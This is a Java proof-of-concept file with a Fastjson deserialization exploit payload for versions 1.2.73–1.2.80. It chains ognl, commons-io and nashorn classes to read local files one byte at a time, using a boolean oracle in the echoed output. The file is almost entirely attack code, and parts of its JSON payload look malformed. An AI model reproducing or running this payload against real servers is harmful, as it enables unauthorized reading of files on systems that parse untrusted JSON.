package test;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;

import com.alibaba.fastjson.JSON;

public class Fastjson23_ognl_io_read_print {
    public static void main(String[] args) throws Exception, IOException{
    	
    	String url = "file:///D:/";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
    	String test = Base64.getEncoder().encodeToString(bs);
    	byte[] testbs = test.getBytes();
        System.out.println(Arrays.toString(bs));
        System.out.println(new String(bs));
    	
        //依赖1.2.73-1.2.80 ognl-3.2.21  commons-io-2.2 需回显，根据回显不一样(关注su18/su17字段)布尔读文件
        String poc1 ="{\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"ognl.OgnlException\"\r\n"
        		+ "	},\r\n"
        		+ "	\"su15\": {\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "			{\r\n"
        		+ "				\"@type\": \"java.lang.String\"\r\n"
        		+ "				\"@type\": \"ognl.OgnlException\",\r\n"
        		+ "				\"_evaluation\": \"\"\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su16\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    /*文件位置*/+ "								\"url\": \"file:///D:/\"\r\n"
        		+ "							},\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
   /*文件bytes*/	+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su17\": {\r\n"
        		+ "			\"$ref\": \"$.su16.node.p.stream\"\r\n"
        		+ "		},\r\n"
        		+ "		\"su18\": {\r\n"
        		+ "			\"$ref\": \"$.su17.bOM.bytes\"\r\n"
        		+ "		}\r\n"
        		+ "	}";
   
   
        System.out.println(poc1);
        System.out.println(JSON.parseObject(poc1));

       
    }
}
